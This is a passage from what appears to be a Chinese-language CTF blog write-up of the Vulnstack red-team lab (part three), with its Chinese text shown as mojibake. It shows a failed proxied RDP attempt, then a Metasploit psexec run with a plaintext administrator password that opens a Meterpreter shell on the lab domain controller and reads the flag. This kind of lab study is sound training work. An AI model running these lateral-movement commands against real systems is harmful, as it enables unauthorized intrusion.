class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">3389</span>  ...  OK\nCore(warning): Certificate received <span class=\"hljs-keyword\">from</span> server <span class=\"hljs-keyword\">is</span> NOT trusted by this system, an exception has been added by the user to trust this specific certificate.\nTLS  Session info: (TLS1<span class=\"hljs-number\">.2</span>)-(DHE-CUSTOM1024)-(RSA-SHA1)-(AES-<span class=\"hljs-number\">256</span>-GCM)\n\nFailed to initialize NLA, do you have correct Kerberos TGT initialized ?\nFailed to connect using NLA, trying <span class=\"hljs-keyword\">with</span> SSL\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">3389</span>  ...  OK\nFailed to connect, CredSSP required by server (check <span class=\"hljs-keyword\">if</span> server has disabled old TLS versions, <span class=\"hljs-keyword\">if</span> yes use -V option).\n</code></pre>\n<p>å¤±è´¥</p>\n</li>\n<li>\n<p>å†å°è¯•<code>Psexec</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">4445</span>\nmsf6 exploit(windows/smb/psexec) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n[*] Meterpreter session <span class=\"hljs-number\">4</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">51849</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span> via session <span class=\"hljs-number\">2</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">58</span>:06 +0800\nmeterpreter > \n</code></pre>\n<p>æˆåŠŸäº†ï¼Œæ‹¿åˆ°äº†åŸŸæ§çš„<code>shell</code> ï¼ï¼</p>\n</li>\n<li>\n<p>æœ€åå‘ç°å¯ä»¥å…ˆè¿œç¨‹åˆ°win2008ç„¶åå†è¿œç¨‹åˆ°åŸŸæ§</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image48.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>è¯»å–Flagæ–‡ä»¶</h2>\n<pre><code class=\"hljs language-python\">C:\\Users\\Administrator\\Documents><span class=\"hljs-built_in\">dir</span>\n Volume <span class=\"hljs-keyword\">in</span> drive C has no label.\n Volume Serial Number <span class=\"hljs-keyword\">is</span> D6DC-065A\n\n Directory of C:\\Users\\Administrator\\Documents\n\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span> AM    &#x3C;DIR>          .\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span> AM    &#x3C;DIR>          ..\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">53</span> AM                <span class=\"hljs-number\">13</span> flag.txt\n               <span class=\"hljs-number\">1</span> File(s)             <span class=\"hljs-number\">13</span> <span class=\"hljs-built_in\">bytes</span>\n               <span class=\"hljs-number\">2</span> Dir(s)  <span class=\"hljs-number\">50</span>,<span class=\"hljs-number\">368</span>,<span class=\"hljs-number\">212</span>,<span class=\"hljs-number\">992</span> <span class=\"hljs-built_in\">bytes</span> free\n\nC:\\Users\\Administrator\\Documents><span class=\"hljs-built_in\">type</span> flag.txt\n<span class=\"hljs-built_in\">type</span> flag.txt\nthis <span class=\"hljs-keyword\">is</span> flag!\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image49.png\" alt=\"image.png\"></p>\n<h2>æ€»ç»“</h2>\n<p>ewä»£ç†ä½¿ç”¨ï¼Œæ›´ç†Ÿæ‚‰MSFæ¡†æ¶ï¼Œä»¥åŠåŸŸå†…æœ‰linuxå’Œwindowsä¸¤ç§ç³»ç»Ÿæ¸—é€ï¼Œå…¶å®é™¤äº†çˆ†ç ´è¿˜æœ‰NTLMä¸­ç»§çš„æ€è·¯ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å®ç°ï¼Œæ¥ç€å°±å»å®ç°NTLMä¸­ç»§</p>","title":"Vulnstack - ATT&CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸‰)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windowsé¶æœº","ç»¼åˆé¶åœº"],"categories":"é¶æœº","description":"ATT&CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸‰)\n\n http://vulnstack.qiyuanxuetang.net/vuln/detail/5/\n \n\né¶åœºæ­å»º\n\n1. ä¿®æ”¹ä»…ä¸»æœºç½‘å¡ A IPä¸º`192.168.93.0` ï¼Œç„¶ååœ¨æ·»åŠ ä¸€å¼ ä»…ä¸»æœºç½‘å¡Bï¼Œipéšæ„ï¼Œæˆ‘è¿™é‡Œä¸º`192.168.213.0` ç½‘æ®µ\n2. webä¸»æœºç½‘å¡å†…ç½‘è®¾ç½®ç½‘å¡ Aï¼Œå‡ºå£ç½‘å¡ä¸ºç½‘å¡B\n3. å…¶ä½™ä¸»æœºç½‘å¡éƒ½æ˜¯ä»…ä¸»æœºç½‘å¡ A\n..."},"recentPosts":[{"id":"ç¾¤Ué¶æœº - Cliv2","title":"ç¾¤Ué¶æœº - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharÃ¡n","title":"TheHackersLabs - PacharÃ¡n","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"}]},"__N_SSG":true}